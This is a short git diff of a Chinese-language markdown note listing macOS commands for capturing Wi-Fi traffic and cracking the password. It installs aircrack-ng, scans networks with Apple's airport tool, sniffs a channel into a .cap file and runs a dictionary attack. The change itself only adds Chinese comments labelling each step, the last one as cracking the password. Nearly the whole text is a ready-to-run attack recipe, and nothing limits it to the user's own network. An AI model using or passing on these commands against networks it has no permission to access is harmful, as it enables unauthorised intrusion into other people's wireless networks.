@@ -6,12 +6,12 @@
 
 ## 所需指令
 ```js
-sudo port selfupdate
-sudo port install aircrack-ng
+sudo port selfupdate #更新
+sudo port install aircrack-ng #更新
 sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s #取得Wifi資訊
 sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 sniff 監聽口 #開始監聽
-sudo aircrack-ng /tmp/終端機會輸出檔案名.cap
-cd  ~/你的Wifi/字典路徑
+sudo aircrack-ng /tmp/終端機會輸出檔案名.cap #檢查監聽輸出的檔案
+cd  ~/你的Wifi/字典路徑 #定位到字典路徑
 sudo aircrack-ng -w 字典名稱.txt /tmp/終端機會輸出檔案名.cap #破解密碼
 ```
 
